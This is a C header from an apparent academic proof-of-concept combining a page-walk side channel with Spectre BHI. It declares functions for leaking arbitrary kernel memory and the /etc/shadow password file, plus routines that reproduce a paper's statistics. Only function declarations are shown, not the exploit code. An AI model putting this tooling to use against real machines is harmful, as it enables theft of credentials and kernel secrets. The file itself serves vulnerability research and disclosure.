#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <sys/time.h>

#include "targets.h"
#include "flush_and_reload.h"
#include "colliding_bhb.h"
#include "poc-common/common.h"
#include "pwsc.h"
#include "mapping.h"
#include "leak.h"
#include "util.h"

#include "poc-common/kaslr_prefetch/kaslr_prefetch.h"
#include "poc-common/l2_eviction/evict_sys_table_l2.h"

// Initialize PWSC + Spectre BHI. PWSC is initialized to use the memory mapping order oracle. 
// The Spectre BHI code is credited to the Inspectre work
void init_pwsc_spectre_bhi(void); 

// Runs a PWC order oracle PWSC test with the Spectre-BHI gadget
void pwsc_test(void); 

// This will leak /etc/shadow using the memory mapping order oracle
// In our paper we assume that using techniques described in past work 
// you can determine the physical address of /etc/shadow in physmap. 
// This is required as input to this function. 
// My prefered strategy is to use the original inspectre code base which will find the /etc/shadow physmap location 
void leak_etc_shadow(uint64_t target_shadow);

// Leak a single u64 (8 bytes) with the memory mapping order oracle. 
uint64_t leak_u64(uint64_t kern_addr);

// Test the leak_u64 function 
void test_leak_u64(void);

// Leak an ASCII string at `addr` with size `size`
// This uses the memory mapping order oracle. 
void leak_ascii(uint64_t addr, uint64_t size);

// This function uses our memory mapping order oracle to leak piece of extracted kernel memory
// that contains interesting bytes that was used to generate the statistics for arbitrary kernel 
// leakage listed in our paper (Table 2). 
void paper_stats(void);